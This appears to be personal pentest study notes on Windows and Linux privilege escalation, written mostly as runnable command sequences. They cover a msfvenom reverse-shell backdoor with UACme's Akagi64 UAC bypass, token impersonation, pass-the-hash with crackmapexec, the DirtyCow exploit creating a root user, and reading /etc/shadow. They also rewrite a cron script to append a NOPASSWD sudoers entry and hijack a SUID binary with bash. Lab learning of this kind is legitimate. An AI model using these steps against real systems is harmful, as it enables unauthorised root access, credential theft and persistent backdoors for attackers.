

- WINDOWS:

-KERNEL EXPLOIT:

After obtaining a meterpreter if we cannot make a hashdump:

search suggester (this post exploitation module shows the vulns & metasploit modules that can be used to elevate privileges) -> select what you want, configurate & run it.


Manual:

Go back to meterpreter -> shell -> sysinfo -> copy info on a text file -> control+c to see the meterpreter -> open another terminal & create a text file with nano & paste the previous info.

Search the directory of windows-exploit-suggester -> execute the python script & add --update -> then execute ./windows-exploit-suggester.py –database theonewecreatedwhenupdating --systeminfo the previous text file (the exploits that are in the firsts positions have more probability to work)

Go back to the unprivileged session of meterpreter and go to the Temp path -> upload /route/chosen/exploit -> shell -> .\exploit.exe 7 (where 7 is the O.S. version - windows 7) -> we obtain a new shell with all the privileges.


-BYPASSING UAC WITH UACME:

Watch the github repo of UACme to see the appropiate technique:

We have access to a Windows with an unprivileged user which is in admins. locales -> cmd -> net users (actual account is IEUser) -> net localgroup administrators -> when you open a cmd as administrator the UAC pop-ups.


In meterpreter:

sysinfo (take notes) -> pgrep explorer -> migrate PIDexplorer -> getuid (we are users of the group admin) -> getprivs (few privileges) -> shell -> net user -> net localgroups administrator -> net user admin password123 (access denied = UAC)

Go to the UACme github repository & download the appropiate version -> msfvenom -p windows/meterpreter/reverse_tcp LHOST=ipkali LPORT=availableport -f exe > backdoor.exe

Open another metasploit & use multi/handler (Config the same as the msfvenom payload) -> run

Come back to the meterpreter session of admin -> go to Temp and if it dowsn't exists, create it with mkdir -> upload backdoor.exe -> upload /root/Desktop/tools/UACME/Akagi64.exe (UAC chosen from the GitHub repo) -> shell -> dir -> .\Akagi64.exe 23 C:\Temp\backdoor.exe (& in the multi/handler listener we have the privileged session)


-ACCESS TOKEN IMPERSONATION:


Those privileges are neccessary for an attack:

SeAssignPrimaryToken: grants permission to impersonate tokens to the user.

SeCreateToken: grants permission to the user to create administrator tokens.

SeImpersonatePrivilege: grants the user to create a process down the context of security of another user with privileges, normally.


incognito Meterpreter module: allows impersonating tokens after exploitation, allows to list the available tokens in order to impersonate them.

Exploitation acces token impersonation:

In a Meterpreter -> sysinfo (take notes) -> pgrep explorer -> migrate PIDexplorer -> getuid -> getprivs (if you have the SeImpersonatePrivilege)-> load incognito (if the session dies do the exploit again) -> list_tokens -u (we have delegation tokens, we are interested in the Administrator account) -> copy that token to the clipboard -> impersonate_token “TOKEN\Administrator” -> pgrep explorer -> migrate PIDexplorer -> getprivs (ya tenemos todos)


If there aren't tokens make the potato attack to create the token & impersonate_token “NT AUTHORITY\SYSTEM”

  
The unattended windows setup utility stores user info. & system info config.: C:\Windows\Panther\Unattend.xml & Autounattend.xml passwords encoded in base64

  
Pass the hash authentication: with the psexec metasploit module or crackmapexec.

metasploit search psexec -> use the suitable one -> config the payload -> set smbpass plaintext OR hash LM:NTLM -> set target Command Native\ upload (the suitable one)

crackmapexec: crackmapexec smb IPobj -u Administrator -H “NTLM hash” (Pwned! = fine) -x “command” to execute commands.

  
- Linux:

-KERNEL EXPLOIT:

We need to know the kernel version (uname -a)

Metasploit Meterpreter + Linux Exploit Suggester:

sysinfo (OS + version + kernel); getuid (user without privileges [even a service user like www-data works])

cd /tmp -> upload ~/Desktop/Linux-Enum/les.sh -> chmod +x les.sh -> ./les.sh (enumerate vulns & exploits, also tells the kernel version ¨& arcquitecture) -> download the DirtyCow from [exploit-db.com](https://www.exploit-db.com/) (written in C) -> mv 40839.c dirty.c (rename) -> gcc -pthread dirty.c -o dirty -lcrypt (follow the compiling instructions of the exploit which are inside of it) -> come back to meterpreter & upload ~/Downloads/dirty (upload the compiled binary) -> /bin/bash -i -> chmod +x dirty -> ./dirty (input a password if you want) -> we get an error because it's not compiled on the victim machine -> come back to meterpreter -> shell -> /bin/bash -i -> gcc -pthread dirty.c -o dirty -lcrypt -> chmod +x dirty -> ./dirty password123 (makes an user firefart which is root & makes a backup of /etc/passwd before creating the user; now we have an user firefart with the password password123) -> su firefart (doesn't work but it's on SSH too) -> ssh firefart@IPobj (login) -> we are root so we can cat /etc/shadow to see the hashes of the user accounts.


-MISCONFIGURED CRON JOBS:


We have access to a Linux target without a privileged account.
  
crontab -l (no crontab for student)

ls -al in home there's a file owned by root without permissions, only has read and write permissions for the root user (file=message)

cd / -> grep -rnw /usr -e “home/student/message” (search resucrisvely from the root path, in /usr where typically are the shell scripts where appears home/student/message) -> response: /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message

We found a shell script (/usr/local/share/copy.sh & the appear of “home/student/message” it tells us the archive that is copied in /tmp/message)

list the /tmp content with ls -al /tmp

We have the message file with reading permissions -> cat the file

ls -al /usr/local/share/copy.sh (the file owns to root but it has permissions for everyone)

We make cat & see that it does what is red & black coloured upside, every minute (the script executes every minute)

in this lab we don't have nano or vim so: printf ‘#!/bin/bash\necho “student ALL=NOPASSWD:ALL” >> /etc/sudoers’ > /usr/local/share/copy.sh

sudo -l (user student may run the following commands:

(root) NOPASSWD: /etc/init.d/cron (before modifying the script)

(root) NOPASSWD: ALL (after modifying the script)

sudo su (we are root without authentication)

crontab -l (to see when the cron jobs is executed)

  
-EXPLOITING SUID BINARIES:

We have access with unprivileged user:

  
en /home/student -> ls -al (we have 2 binaries, greeting & welcome, both belongs to the root user) greeting only has permissions r & x for root but welcome has permissions rwsrxrx which S is the SUID privilege and we can execute it with privileges.

file welcome is an ELF standard binary with a shared object (after the interpreter = shared object) if the shared object doesn't exist we can create one with malicious code that elevates our privileges. In this case the shared object exists (noone is missing)

strings welcome to see the shared object & see the setuid (so it's a SUID) and we see that it invokes the binary “greetings”, which is external, but executes it.

rm greetings -> cp /bin/bash greetings now the welcome binary executes the bash shell as root when I execute the welcome binary, and now I'm root

Now we can cat /etc/shadow to see the user passwords hashed and whaterver we want.

  
-EXPLOITING A VULNERABLE PROGRAM:

After obtaining a meterpreter:

shell -> ps aux (root executes a binary /bin/check-down through a bash /bin/bash [first the bash appears and then the binary]) 

cat /bin/check-down (is a bash script that from a while loop executes every 60 seconds the program chkrootkit)

chkrootkit is a program that scans the PC to prevent the execution of a rootkit, in this particular case, is vulnerable to a privilege escalation (this vuln only affects versions previous than 0.5.0)

To see the version of the program chkrootkit –help -> chkrootkit -V

Control+C to close the shell channel

Background the meterpreter session

search chkrootkit -> use -> show options -> session & path of chkrootkit & lhost & lport -> exploit (if it doesn't works put the absolute path of chkrootkit) and we are root.